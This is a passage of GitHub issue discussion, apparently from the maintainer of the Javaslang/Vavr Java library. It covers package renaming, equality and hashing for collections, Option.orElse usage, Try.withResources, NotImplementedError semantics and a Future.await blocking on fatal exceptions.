artifact-id: javaslang\n  version:     1.x.y\n  package:     javaslang.*\nJavaslang 2\n  group-id:    io.javaslang\n  artifact-id: javaslang\n  version:     2.x.y\n  package:     javaslang.*\n```\nIn Javaslang 3 we could change the package name to io.javaslang:\njava\nJavaslang 3\n  group-id:    io.javaslang\n  artifact-id: javaslang\n  package:     io.javaslang.*\nThat would solve the problem (for now). I do not expect a major version jump to 4 the next years.. Ok, then let's do it!. @skestle \n\nFood for thought; I'll check up when v3 is released ;).\n\nThank you for the inspiration! Looking forward to further discussion.. @skestle @nfekete I've read and understood both your point of views (v1 and  v2). Both are true (v1 \u2227 v2) in my opinion but they lead to contrary results: v1 => a, v2 => \u00aca.\nWe can't have both at the same time a \u2227 \u00aca.\nMaybe it indicates that the versioning problem is not solvable in an adequate way. I think it is no coincidence that the new Java 9 Module System will not solve the versioning problem (see Will There Be Module Hell?).\nTrying to solve it will lead to new problems, as @nfekete described.\nWe should not try to solve the versioning problem in Vavr. It is the job of (build) tools, not the job of a library.. I believe that in a real-world application (with jar hell) the probability is very high that there might occur problems (over time) with overlapping transitive dependencies.\nIt is a general problem that can\u2019t be healed by just fixing the namespaces of one library. We need a build tools and runtimes that find and solve version problems in general.. @talios yes, I thought about finer grained packages. But without extension methods we can't separate the conversion methods toXxx() (e.g. toList()) from Values like Option. Also the new base API interface, that provides shorter factory methods for almost all types, could not be separated from the other packages. Currently modularity is no option for us.. This is out-of-scope for Vavr.. @v1ctor\n\nTo fix this problem I've overwritten equals and hashCode methods like this: ...\n\nYour IntMap.equals()/hashCode() overrides look great!. @v1ctor Please take a look at my proposal\nThe equals() impl for Map and Multimap should be roughly equivalent to the one for Set.. @v1ctor I made more tests. These implementations work fine for me (Seq and Set):\n```java\nclass Collections {\n@SuppressWarnings(\"unchecked\")\nstatic <T> boolean equals(Seq<T> seq1, Object o) {\n    if (o == seq1) {\n        return true;\n    } else if (seq1 != null && o instanceof Seq) {\n        final Seq<T> seq2 = (Seq<T>) o;\n        return seq1.size() == seq2.size() && areEqual(seq1, seq2);\n    } else {\n        return false;\n    }\n}\n\n@SuppressWarnings(\"unchecked\")\nstatic <T> boolean equals(Set<T> set1, Object o) {\n    if (o == set1) {\n        return true;\n    } else if (set1 != null && o instanceof Set) {\n        final Set<T> set2 = (Set<T>) o;\n        if (set1.size() != set2.size()) {\n            return false;\n        } else {\n            try {\n                return set1.forAll(set2::contains);\n            } catch(ClassCastException x) {\n                return false;\n            }\n        }\n    } else {\n        return false;\n    }\n}\n\n...\n\n// already existis!\nstatic boolean areEqual(Iterable<?> iterable1, Iterable<?> iterable2) { ... }\n\n}\n```\nNote: We intentionally reduce the costs by don't putting the size equality check into the try/catch block.\nThe Map, Multimap equals impls are similar to the one for Set.\n\nOpen issue: We need a new hashing strategy for Set, Map and Multimap. Especially we need to ensure that equals(a, b) == true => a.hashCode() == b.hashCode(), e.g. if a is a Set/Map and b is a SortedSet/LinkedSet/SortedMap/LinkedMap.\nScala uses scala.util.hashing.MurmurHash3 but I think it is not part of this issue to implement a sophisticated new hashing algorithm. We must just ensure that the equals/hashCode contract is fulfilled.\nCurrently we do it in HashMap by summation of all elements starting with 0. But I think it is a better idea to start with 1 because\n\nour empty collections always have a hashCode of 1\nwe can distinguish collections that contain empty collections\n\nPlease give this one a try for Set, Map, Multimap:\njava\nclass Collections {\n    public int hashUnordered(Iterable<?> iterable) {\n        if (iterable == null) {\n            return 0;\n        } else {\n            int hashCode = 1;\n            for (Object o : iterable) {\n                hashCode += Objects.hashCode(o);\n            }\n            return hashCode;\n        }\n    }\n}\n. @v1ctor thank you for your ongoing effort and your long breath \ud83d\udc4d\ud83c\udffc, this is not a trivial issue.. @v1ctor take your time!. Hi @v1ctor \nthank you, you did a great job!\nI will take the time this evening to check out you branch and play around with it. On a first sight the changes look good.\n. @v1ctor I already took a look but still need some time (I have too many open tasks).\nYou will receive a PR for your branch (if that is possible with git!?) the next days. It is necessary because this is a big change and it is easier to get the last few % right.. Replaced by a new PR: #1948. Interestingly this is also ambiguous:\njava\nSet<Integer> set1 = TreeSet.of((i, j) -> j - i, 1, 2, 3);\nSet<Integer> set2 = TreeSet.of(Integer::compareTo, 1, 2, 3);\nWorkaround:\njava\nSet<Integer> set1 = TreeSet.<Integer> of((i, j) -> j - i, 1, 2, 3);\nSet<Integer> set1 = TreeSet.<Integer> of(Integer::compareTo, 1, 2, 3);\nIs this a problem that needs to be addressed in 3.0.0? E.g. is our API generally broken when optional lambdas are passed as first parameter to static factory methods?\nDid the compiler behaviour change in recent JDK versions?\n. This is possible/compiles fine (without type-hint):\njava\nComparator<Integer> intcomp = (i, j) -> j - i;\nSet<Integer> set1 = TreeSet.of(intcomp, 1, 2, 3);\nSet<Integer> set2 = TreeSet.of(Comparator.reverseOrder(), 1, 2, 3);\nIt is not a bug, it is how Java's type system behaves.\nWontFixIt . Note: All incoming features are targeted to 3.0.0 until the current 2.1.0 are finished. When we ship 2.1.0-beta we will pick features from 3.0.0 that should be part of 2.1.0-RC1.. See also #1701. We unclutter Vavr 1.0 and remove all non-native annotations.. @mduesterhoeft let's take your solution (+ my review requests). I like to see PRs from other ppl!\n. Many thanks, looks great!. Thank you!. @happyser Sorry for answering so late - I needed every minute to prepare the next bugfix release 2.0.6 (which will be released neartime).\nI've thought about it and played around with the new syntax.\nAs @paplorinc mentioned above, this suggestion can be seen as an alternate syntax for the existing orElse(T) resp. orElse(Supplier<T>) methods.\nLong story short: I see no real benefit. The initial example can be expressed like this:\njava\nmakeSomeOption().orElse(() -> Option(getSomeOtherValue()))\n                .orElse(() -> Some(\"can't find a value\"))\nCompared to the new approach:\njava\nmakeSomeOption().orElseOf(() -> getSomeOtherValue())\n                .orElseOf(() -> \"can't find a value\")\nThe only difference is, that we currently create the Option instance explicitly. However, both approaches (yours and the existing one) are making use of Suppliers, so instances are only created if necessary.\nThe new approach broadens the API by adding a different name to existing functionality.\nPlease understand that I close the PR.. Thank you anyway!. thanks, will take a look. @hepin1989 I've looked into the repo and played around with the syntax.\nWhat Josh did in scala-arm is introducing a new (filter-)monadic type ManagedResource (having map() and flatMap()). This can be used with the for-comprehension (while preserving the monadic structure).\nIn Javaslang it could look like this:\njava\nManagedResource<R> result =\n    For (\n        ManagedResource(() -> new FileInputStream(...)),\n        ManagedResource(() -> new BufferedOutputStream(...))\n    ).yield((fi, bo) ->\n        ...\n    );\nThe result can be converted to an Option, Either or Future for example.\nIn our Try.withResources implementation we use Try builders named Try.WithResource1, ..., Try.withResources8, depending on the number of resources.\njava\nTry<R> result =\n    Try.withResources(\n        () -> new FileInputStream(...),\n        () -> new BufferedOutputStream(...)\n    ).of((fi, bo) -> {\n        ...\n    }).andFinally(\n        ...\n    );\nMy thoughts\nPro ManagedResource:\n\nA new Monad scales better: it is just one type instead of several builders (one for each argument count). (However, we also have to create new For-comprehension 'builders' API.For(ManagerResource)).\nThe well-known For-comprehension syntax can be used (but we need to apply a resource wrapper)\n\nPro Try.withResources:\n\nNew types for builders are a bit more lightweight (in terms of maintainability) than introducing a new Monad\nThe Try.withResources syntax aligns closer to Java's try-with-resources syntax. I.e. AutoCloseables are in Java managed within a try-catch block. Pulling this resource management out of the Try context is mystifying things a bit.\n~~With Try we are able to execute a finally block, a For-comprehension hasn't the ability~~ Update: not really a pro argument. A finally block is nothing else than an additional Try.run(() -> {...}).\nWe do not need to convert the result. (In Josh's examples a ManagedResource additionally needs to be converted to another Monad in order to process the underlying value.)\n\n. Note: Calls to mapFailure will be unchecked in 2.1.0 because\n\nTry in an interface\n=> we can't make Try.mapFailure() final\n=> we can't mark Try.mapFailure() as @SafeVarargs\n\nSolution: make Try an abstract class (see #1825)\n. All of Either, Either.RightProjection and Either.LeftProjection extends Value:\njava\ninterface Either<L, R> extends Value<R> {\n    final class LeftProjection<L, R> implements Value<L> { ... }\n    final class RightProjection<L, R> implements Value<R> { ... }\n}\nI.e. they all inherit the following conversion methods:\njava\ntoArray()\ntoCharSeq()\ntoEither(Object)\ntoEither(Supplier)\ntoInvalid(Object)\ntoInvalid(Supplier)\ntoJavaArray()\ntoJavaArray(Class)\ntoJavaCollection(Function)\ntoJavaList()\ntoJavaList(Function)\ntoJavaMap(Function)\ntoJavaMap(Supplier, Function)\ntoJavaMap(Supplier, Function, Function)} </li>\ntoJavaOptional()\ntoJavaParallelStream()\ntoJavaSet()\ntoJavaSet(Function)\ntoJavaStream()\ntoLeft(Object)\ntoLeft(Supplier)\ntoLinkedMap(Function)\ntoLinkedMap(Function, Function)\ntoLinkedSet()\ntoList()\ntoMap(Function)\ntoMap(Function, Function)\ntoOption()\ntoPriorityQueue()\ntoPriorityQueue(Comparator)\ntoQueue()\ntoRight(Object)\ntoRight(Supplier)\ntoSet()\ntoSortedMap(Comparator, Function)\ntoSortedMap(Comparator, Function, Function)\ntoSortedMap(Function)\ntoSortedMap(Function, Function)\ntoSortedSet()\ntoSortedSet(Comparator)\ntoStack()\ntoStream()\ntoString()\ntoTree()\ntoTry()\ntoTry(Supplier)\ntoValid(Object)\ntoValid(Supplier)\ntoValidation(Object)\ntoValidation(Supplier)\ntoVector()\nI think there is nothing to do, you might have overseen the methods of Value. I will close the ticket.\n(Update: We convert to concrete types, e.g. toList() or toVector() instead of toSeq(). It gives us more control over what happens.). (basically nothing to review here - just copy-pasted existing methods in different order). Yes, you are right. This makes sense. Unfortunately we would have to change the Value.toTry() contract. Currently we have\n\n... a new {@code Failure(NoSuchElementException)} is returned ...\n\nJust changing the behavior of Future.toTry() would violate the Liskov substitution principle. Breaking the behavioral subtyping could break applications.\nI will target this change to 3.0.0. We will change the base type Value in the way that the conversion method toTry() may return a Failure of any exception in the empty case.\n. @paplorinc I think it is different. Gwt can be used without leaving the Java world. Technically it compiles to Javascript but the developer does not need to know it. (However, the Gwt developer may also add his/her own Javascript snippets). @paplorinc I think this issue does not fit well into the core javaslang project. We could create a new project javaslang-typescript but I don't think there is a real use-case.\nPersonally I'm doing some javascript (and typescript). Programmers that do Javascript will look within the JS ecosystem for libraries.\n\nThere are already libraries present for FP, like ramda.js.\nAlso scala.js is a type-safe way to create Javascript from Scala.\n\nBeside that we can't substitute our Gwt project with this kind of Javascript compilation.\nI think we should close this ticket.. > What is the GWT project's purpose than, if you rather recommend other libs for javascript programmers?\nComparing GWT and Javascript is like comparing Coffee and Tee.\nGWT is 'web programming for Java developers'. Years ago I've done a bit GWT programming. The layout felt a little bit like Swing programming :-)\nVaadin integrates with/is built on top of GWT: https://vaadin.com/gwt. @paplorinc This is GWT code - pure Java. Thank you for your question. I took me some time to get your example compiling because there are missing many type informations. For the next time it would help me if you could provide a more minimal and complete example.\nThis is what I've come up with:\n```java\nimport javaslang.control.Option;\nimport javaslang.control.Try;\nimport static javaslang.API.*;\npublic class Test {\nTry<TransactionData> test(int c1, Option<Integer> c2, String s1, Option<String> s2, TransactionData currTxn, Option<TransactionData> maybeLatestTxn) {\n    return Seq(Tuple.of(currTxn, maybeLatestTxn))\n            .flatMap(tuple ->\n                    checkNew.apply(c1, c2, s1, s2, tuple._1, tuple._2)\n                            .orElse(checkDowngrade.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n                            .orElse(checkUpgrade.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n                            .orElse(checkRenew.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n                            .orElse(checkExpire.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n            ).toTry();\n}\n\nprivate Function6<Integer, Option<Integer>, String, Option<String>,\n        TransactionData, Option<TransactionData>, Option<TransactionData>> checkNew =\n        (c1, c2, s1, s2, tx1, tx2) -> Seq(tx1)\n                    .filter(t -> tx2.equals(Option.none()))\n                    .map(t -> t.setEvent(DBEvent.CREATE))\n                    .toOption();\n\nprivate Function6<Integer, Option<Integer>, String, Option<String>,\n        TransactionData, Option<TransactionData>, Option<TransactionData>> checkDowngrade = null;\n\nprivate Function6<Integer, Option<Integer>, String, Option<String>,\n        TransactionData, Option<TransactionData>, Option<TransactionData>> checkUpgrade = null;\n\nprivate Function6<Integer, Option<Integer>, String, Option<String>,\n        TransactionData, Option<TransactionData>, Option<TransactionData>> checkRenew = null;\n\nprivate Function6<Integer, Option<Integer>, String, Option<String>,\n        TransactionData, Option<TransactionData>, Option<TransactionData>> checkExpire = null;\n\ninterface TransactionData {\n    TransactionData setEvent(DBEvent dbEvent);\n}\n\nenum DBEvent {\n    CREATE\n}\n\n}\n```\nBecause it does compile, the types are right. Is this what your types look like, especially for the functions I added?\nI understand that there are two types of orElse signatures. But I can't see a compiler conflict here.\nWhich IDE/compiler do you use? Eclipse/ECJ or IntelliJ IDEA/javac?\nThx\n- Daniel. Which version of Javaslang do you use?. I think you use 2.1.0-alpha because of the API.Seq(...) factory method.\nI highly recommend to use the latest stable bugfix release (currently 2.0.5).\nYour code can be simplified like this:\njava\n    return Option.of(Tuple.of(currTxn, maybeLatestTxn))\n            .flatMap(tuple ->\n                    checkNew.apply(c1, c2, s1, s2, tuple._1, tuple._2)\n                            .orElse(checkDowngrade.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n                            .orElse(checkUpgrade.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n                            .orElse(checkRenew.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n                            .orElse(checkExpire.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n            ).toTry(() -> new Error(\"Can't create TransactionData\"));\nI used Option instead of Seq and toTry instead of toOption. Given that you are able to provide a meaningful error message (instead of NoSuchElementException(...)).. Regarding your initial question: You have to use Suppliers with orElse in order to ensure that check* aren't evaluated if not necessary(!), i.e.\njava\n    return Option.of(Tuple.of(currTxn, maybeLatestTxn))\n            .flatMap(tuple ->\n                    checkNew.apply(c1, c2, s1, s2, tuple._1, tuple._2)\n                            .orElse(() -> checkDowngrade.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n                            .orElse(() -> checkUpgrade.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n                            .orElse(() -> checkRenew.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n                            .orElse(() -> checkExpire.apply(c1, c2, s1, s2, tuple._1, tuple._2))\n            ).toTry(() -> new Error(\"Can't create TransactionData\"));\nI hope this helps.\nI'm pretty sure that the current Option methods work, there is no error. The functionality is well covered by unit tests.\nIf you don't mind, I will close the issue.\n. @Vivek-Patil If you do not have any transitive dependencies that depend on Javaslang, you may use 2.1.0-alpha. Currently I'm preparing 2.1.0-beta.\nI also use IntelliJ IDEA 2017. The code I've written above works with 2.0.5 and 2.1.0-alpha. Please use orElse with Suppliers and all should be fine.. No, toOption() is perfectly fine. But I replaced Seq with Option at the beginning. I see no reason to use a collection. The natural use-case is to use an Option directly. However, it is your choice.\nI will close this issue because there is no reason to change the code-base. Feel free to ask more question in this issue if still something isn't clear to you.. @codesourceress it will come, but not within the next few weeks.... @ruslansennov thanks for the review!. Casts come nearly with no costs. It is unrealistic that we are able not to use casts or check that casts aren't used in PRs.. > \nI think cast are widely used in practice. Example (Vavr 1.0 code-base):\njava\n    @SuppressWarnings(\"unchecked\")\n    public <U> Try<U> flatMap(CheckedFunction<? super T, ? extends Try<? extends U>> mapper) {\n        Objects.requireNonNull(mapper, \"mapper is null\");\n        if (isSuccess()) {\n            try {\n                return (Try<U>) mapper.apply(get());\n            } catch (Throwable t) {\n                return failure(t);\n            }\n        } else {\n            return (Try<U>) this;\n        }\n    }\nI wouldn't say it is unsafe. A better wording would be that it is error-prone.\nIf we do it wrong, we need a bug fix. After that, it will work as expected.. We removed Either.left() and Either.right(). See #2286 . @fagossa This definitely sounds interesting. What is the return type of the first combine call?\njava\nnew Validation.Builder<String, Person>().combine(p -> validateAge(p))\nA List can only hold values of one type, say T. How are the List objects correctly typed when calling .apply(Person::new).\n(You wrote .apply(person) but I think you meant .apply(Person::new)). Interesting approach. It is (more or less) equivalent to\njava\nstatic <T, E> List<E> validate(T value, Function<? super T, ? extends Option<? extends E>>... validators) {\n    return List.of(validators).flatMap(validator -> validator.apply(value));\n}\nExample:\njava\nList<String> errors = validate(person,\n        p -> validateAge(p),\n        p -> validateName(p),\n        p -> validateEmail(p)\n);\n\nIt is too early to create a PR now. I will take your issue into account when revisiting Validation.\nThere are too many open issues regarding Validation at the moment, e.g. Validation<String, T> vs. Validation<List<String>, T> after combination (but also other things).\nI need to understand the whole scenery before fixing one specific point.. Validation in this form will probably not part of Vavr 1.0 - it does not scale well because of the restriction to Function8.\nInstead we should think about a redesign from scratch or leave it away and stick to alternatives like Either.sequence.... The current build did not fix the codecov problem.\n\nThis was the last successful build:\n\n\n\nThis was the first buggy coverage:\n\n\n\nIn order to find the root of the problem I will check the local coverage xml reports first. Maybe something wrong is sent to codecov.\n. See also https://github.com/codecov/example-java. Automagically fixed after I merged the next PR. Can be closed.. @pli2014 the new Version 2.0.6 includes the bugfix. Please update your version.. Hi @aranikrishna,\nthank you for your suggestion.\nI've thought about the same when designing the Javaslang API. I searched for a way to add Scala features in a Java way.\nIn Java 8 we have Optional.of() and Stream.of(). Java 9 will introduce collection factory methods List.of(), Set.of() and Map.of(). Having of() factory methods seems to be streamlined. So you will find of() factory methods in almost all Javaslang types.\nAnother argument for having of() methods is the steep learning curve. I want a Future - I type Future.of(...). I want a Tuple, I type Tuple.of(...). I want a Map, I type Map.of(...). Easy.\nGenerally, I aligned Javaslang to Scala. In Scala a class may have a companion object. That object has static factory methods, one of them is apply(). Instead of MyType.apply(...) we may write the sugared form MyType(...).\nIn Java we do not have that kind of syntactic sugar. In order to simplify things I added API.* to Javaslang, which will be released with 2.1.0. The idea is to add one import to access most of the Javaslang API:\n```java\nimport static javaslang.API.*;\n// instead of Tuple.of(x, y, z)\nTuple(x, y, z)\n// instead of Set.of(1, 2, 3)\nSet(1, 2, 3)\n// instead of Option.of(x)\nOption(x)\n// instead of Option.some(1)\nSome(1)\n```\nAs you see, we already have thoroughly designed the API. Changing it would mean to break it. Currently I see no reason to do that.\nI will close this issue and hope I could clarify the design decision a bit.\nThank you,\n- Daniel. Wow, thank you for the finding! This corner case slipped through our test suite. We covered only min()/max() computation of multiple elements.. Great, thank you!. Closing the issue, Iterator now does not contain toStream() anymore. Thx @ruslansennov for fixing it!. Will re-open it, also Stream.ofAll(...) should not be used anymore by Iterator internally.. Note: Iterator does not extends Traversable anymore. It might be an option not to implement all methods.. Thank you :) I will finish my review this evening!. Great, many thanks!. This goes adhere with #2041 . Thank you, good work!. @v1ctor thank you for solving the issue - that was one of the harder ones...\n\nIf you have something else in your mind feel free to assign me.\n\nGreat, I will definitely do that. I'm planning now the next releases, this will take some days.. Ready, steady, ... merge!. Thank you, it looks good to me!\nIt may be that I remove all deprecated methods (including these) before the final release of vavr-0.9.0. I will go through the remaining open issues again to see which of them are outdated.\nvavr-0.9.0 will not be backward compatible. We will still maintain the javaslang-2.0.x line. But vavr is a new beginning. We will not release a final version 2.1.0. Instead we prepare a 0.9.0 that will be released neartime (within the next two weeks). spring-data does need it before the release on May 25th. I intentionally named the version 0.x because of the time-pressure. We still have the option to release a 1.x afterwards that may contain backward-incompatible changes. But if we are able to make these changes in 0.9 we don't need to do a 1.0. Instead we can target a 0.10. We will see.... Hah, good catch ;). A NotImplementedError is defined to be non-recoverable, like Scala's NotImplementedError. It has to be used as such.\nFrom the Scala Docs:\n\nThrowing this exception can be a temporary replacement for a method body that remains to be implemented.\n\nThere is no room for interpretation.\nWe should close this ticket.. Both Error and RuntimeException are unchecked exceptions, so technically there is no difference.\nUnsupportedOperationException is a good example for a semantically missing implementation. It extends RuntimeException and has the (original) meaning that it is intended that no implementation exists. It was necessary for Java to introduce it because of the Java Collection Framework's immutable classes.\nOur NotImplementedError is another cup of tea. It can be thrown by using the TODO() method of API (similar to Scala's Predef's ???). The main use is in the field of rapid prototyping. We want rapidly get our code statically compile in order to not cope with the bloody details (for a moment):\n```java\nR compute(A a) {\n    return TODO(/ Will do that later... /);\n}\nvoid run() {\n    compute(TODO(/call service1 to get an A/)).doSomethingMeaningful();\n}\n```\nA Program that contains TODO()s is wrong (by definition) and should not go to production! The user should not try to handle NotImplementedErrors. These are more sort of development-time errors than runtime errors.\n\nThe Fatal / NonFatal discussion is a different story. It has only to do with the internal implementation of Try (in Scala and in ~~Javaslang~~ Vavr).\nMore specifically\njava\nTry(() -> { throw new Err(); });\nwill result in a Failure if Err is considered to be NonFatal. If it is considered to be Fatal, the application will re-throw the cause instead of creating a Try instance. That is all.\nFor example a StackOverflowError extends VirtualMachineError but ~~is~~ UPDATE: was considered to be NonFatal because a flooded Stack is cleaned up by the JVM when the method body exits. But an OutOfMemoryError may mix up the program semantics. The program execution is non-deterministic in such a case.\nPlease see also Vavr's Try.NonFatal.\nPlease note that this is subject to change. See #1382 and #1722. However, fatal exceptions will still be re-thrown in Vavr but exceptions will not be wrapped anymore in NonFatal and Fatal :)\n\nTrust me, extending Error is correct.. ~~I've recognized that we should re-introduce StackOverflowError as non-fatal exception. I will create an issue. (--> #1962)~~ I closed the issue again.. I currently see no problem that arises. If in doubt, we always align to Scala.\nWe want to signal that it is semantically an Error if the underlying program runs into a NotImplementedError, regardless if it is recoverable or not.\nThis is by definition. It is part of our suggested programming model and part of the contract of the TODO() method.\nBefore having TODO(), the only possibility was to assign null to such code-parts. This could leak undefined behaviour into the code base. The job of TODO() resp. NotImplementedError is to put this right.\nWhen we start to treat NotImplementedError as recoverable exception, the original idea of replacing null is broken again. It will lead to a JavaScript-like undefined state. We have to make clear that a TODO() is an error that has to be fixed by the developer.\n\nTry.Fatal can be understood as\n\nComputer, stop now. Immediately.\nIt makes no sense to do anything else than shutting down.\nEven writing something to the logs makes no sense anymore. It might end up in chaos.\n\nBut you are right, Try may leak a NotImplementedError into production, in every scenario we discussed so far.\nHowever, I would leave it this way. Fatal exceptions are very rare. It means \"shut down, now\". It is more something 'physically broken'  than 'logically broken'. I would align to Scala here.\n\nIt was interesting to discuss about it because even something simple as an Exception may span a whole universe of aspects. For example I did not think about the dependency to Try.Fatal, yet.\nHowever, sprinkling dependencies to something simple like NotImplementedException across the code-base is evil on its own. Before doing this I would consider to remove TODO() and NotImplementedError instead. Simplicity is the most important goal.\nLet's close this ticket.. Thanks. This issue is a good reference, I will take parts for the documentation.. @nfekete (related)\nI think the other way makes sense: making NotImplementedError fatal. We then ensure that it does not leak into a Failure.. No, it was also removed in Scala. I've confused it with an out-dated version of NonFatal. This is the most recent one.. Scala act's similar, i.e. not completing the Future in the case of a Fatal exception:\n```scala\nscala> import scala.concurrent.\nimport scala.concurrent.\nscala> import scala.concurrent.ExecutionContext.Implicits.global\nimport scala.concurrent.ExecutionContext.Implicits.global\nscala> Future(throw new InterruptedException())\njava.lang.InterruptedException\n    at $line7.$read$$iw$$iw$$iw$$iw$.$anonfun$res2$1(:16)\n    at scala.concurrent.Future$.$anonfun$apply$1(Future.scala:653)\n    at scala.util.Success.$anonfun$map$1(Try.scala:251)\n    at scala.util.Success.map(Try.scala:209)\n    at scala.concurrent.Future.$anonfun$map$1(Future.scala:287)\n    at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29)\n    at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29)\n    at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60)\n    at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:140)\n    at java.util.concurrent.ForkJoinTask.doExec(ForkJoinTask.java:289)\n    at java.util.concurrent.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1056)\n    at java.util.concurrent.ForkJoinPool.runWorker(ForkJoinPool.java:1692)\n    at java.util.concurrent.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:157)\nres2: scala.concurrent.Future[Nothing] = Future()\n```\nScala's solution:\n\nFork join execution context loses fatal exceptions\nSI-7029 - Makes sure that uncaught exceptions are propagated to the UEH ...\n\nReferences:\n\nDealing with InterruptedException\nBeing Aware Scala 2.10.0 Futures Conceal Fatal Exceptions\nHow to Handle Died Threads due to Uncaught Exceptions in Java\n. @Ramblurr this is no bug, it is correct behavior. Scala acts the same (see links above).\n\nThis is the critical code section:\njava\n    @Override\n    public Future<T> await() {\n        final Object monitor = new Object();\n        // will not be executed if the Future does not complete (e.g. if a fatal exception occurs)\n        onComplete(ignored -> {\n            synchronized (monitor) {\n                monitor.notify();\n            }\n        });\n        synchronized (monitor) {\n            if (!isCompleted()) {\n                Try.run(monitor::wait);\n            }\n        }\n        return this;\n    }\nOn when the Future completes, the blocking monitor is notified and the Thread awakes.\nThe result of a Future computation is a Try - namely a Success or a Failure. The Failure does only encapsulate causes that are so-called non-fatal. An InterruptedException is Fatal and re-thrown by the Try.\nThe fatal exception takes place silently in the ExecutorService Thread. Such a Thread can register an UncaughtExceptionHandler in order to react to uncaught exceptions. However, we currently do not support uncaught exception handlers.\nNevertheless, a handler would not solve the problem of the blocking await() call. The real problem is, that await() waits infinitely long for the Future to complete. Under the presence of a fatal exception the Future will never complete. As a result, await() will never terminate.\nScala act's the same:\nscala\n// = Future(<not completed>)\nFuture(Await.ready(Future { throw new InterruptedException() }, Duration.Inf))\nI.e. the Await.ready() will never complete when we throw an InterruptedException in Scala (which is also fatal there). If we throw an Exception instead, we get a Failure, as expected.\nPlease note that we can't just abort await() in the case of a fatal exception. The state of the Future would be not completed. But the semantics of await() is to wait until the Future is completed.\nAlso Failure can't wrap a fatal exception. The meaning of fatal is, that it can't be handled, so it is re-thrown.\n\nThis issue is 'expected' behavior, it can't be 'solved'.\nI see these follow-up tasks regarding this issue:\n\nWe should provide a mechanism to handle uncaught exceptions. This will give insight into the execution of our program and the ability to handle these exceptions and perform cleanup operations.\nWe should add a Future.await(timeout) (related to #1871)\nWe should remove/deprecate Future.await() (i.e. without a timeout param) because it might lead to deadlocks.\n\nPlease note that await(timeout) needs to cancel a running thread (by interrupting it). Such an interruption should not leak out of the Future, i.e. it should not be re-thrown as fatal exception.. The test will look like this:\njava\n@Test\npublic void shouldHandleInterruptedExceptionCorrectlyInAwait() {\n    final Future<String> future = Future.of(() -> { throw new InterruptedException(); });\n    future.await(Duration.ofMillis(100));\n    assertThat(future)isEqualTo(Future.failed(new java.util.TimeoutException(\"Future timed out after 100 milliseconds\")));\n}\n. I thought you meant including 'NotImplementedError' into the set of fatal exceptions when you said to create a ticket for Try.Fatal :)\nThis issue will be solved when we solve #1722.. Yes, this is on my agenda for the next days.. Looks great, thank you!. Every time I think again about it (#1861, this #1969 and there might exist other issues) I get to the same result: a lazy needs to evaluate a value - there is no undefined. This is mainly because we do want to use Lazy<T> in place of T. The only difference is, that its evaluation is deferred.\n(~~This shows again,~~ Value is not necessarily a Monad). There are common interfaces LinearSeq and IndexedSeq - and on top of them Seq and Traversable.\nWhich methods do you mean for example?. We have already package-private classes for that purpose in io.vavr.collection, e.g. Collections, Maps, Multimaps, Comparators, AbstractMultimap and AbstractQueue. But I think there is potential to further simplify things.\nHowever, please note that there is a JDK bug, that prevents us from using method references when we use package-private abstract classes. See #1326 . I will close this ticket. Improvements are ongoing progress.. Great, many thanks!. Hi,\n\nAny thoughts on adding Tuple{2,3,4....}.empty() ?\n\nI think that is not possible. What should be an instance of an empty Tuple2? We will not use null as placeholder for nothing!\nE.g. the following is no option for us:\njava\n// = Tuple2(null, null)\nTuple2<Void, Void> empty = Tuple2.empty();\nAre you aware of Tuple0, the empty tuple?\n\nIs there going to be renaming of the packages from javaslang to vavr?\n\nYes, we have to do it. We are not allowed to use the name 'javaslang' anymore. Because renaming the package is not backward compatible in the sense of a 'drop-in' replacement, we will also take the opportunity and make changes to the API that were previously targeted for javaslang 3.0.0.\nThe new vavr release will have the version 0.9.0. We have to ship a release neartime for several reasons and want to have a 'backdoor' to ship a major release (i.e. 1.0.0) short time after 0.9.0. However, we plan to do all backward incompatible changes in 0.9.0, so maybe a 0.10.0 will follow.. Btw, we did the same with Option by adding\njava\ninterface Option {\n    static Option<Void> nothing() {\n        return Some(null);\n    }\n}\nThis confused our users. We will remove it with the upcoming release.. Hi,\n\nthere might be value in having a Just type representing the Just monad.\n\nI'm not aware of a Just monad. Do you mean Haskell's Maybe monad, that has Just (representing a defined value) and Nothing (representing the empty state)?\nThe Maybe monad is exactly our Option (the only difference is the name).\n\nI wished my regular objects supported .map and many of the other methods of Value\n\nI do not understand that. What is a 'regular' object? Value is an interface, you are able to implement it. There is no default implementation for .map(), so you have to specify what the semantics of map() is in the context of your 'regular'  object.\nI do not understand the use-case of your suggestion to add a Value value() method. Do you have some code that shows a use-case of a value() methods?\nYou're are already discussing technical solutions but you haven't specified the problem that should be solved. The chance is high, that there is already a solution present.\n(@Opalo you reacted with +1, maybe you also have an example/a use-case). Hi all (@durron597, @Opalo, @nfekete),\nI see three options:\n\nAdding a static factory method static <T> Value<T> just(T obj) { ... } to Value.\nIntroducing a new Monad called Just or Id\nUsing method chaining\nUsing existing monads\n\nHere are my thoughts:\nAd 1) We return an instance of type Value, i.e. an internal implementation. As @durron597 said, Value can't have flatMap() because of Java's type system limitations. Therefore this is no option for us.\nAd 2) We could add a new Monad that wraps a Value. It has to be always defined (otherwise it would be exactly like Option). But then filter() cannot return an instance of the new Monad type because we have no 'empty' state. It would have to return Option (like Lazy's filter() does, because a Lazy value is always defined by definition). Do we really want that?\nAd 3) Method chaining does only cover the map() method. So this might help in some cases.\nAd 4) Our existing already cover many use-cases along the call chain, e.g. undefined values (Option), presence of errors (Try), lazy evaluation (Lazy, Stream), ...\nSummed up I suggest to use one of the existing Monads, the one that fits best the use-case. E.g. in @Opalo's example the App would be more robust if we had an empty state for templateLoader::findByType. I would use Option or Try here.\nI would prefer Option or Try over Lazy (to wrap a single value) because lazy internally create additional Suppliers.\nI would 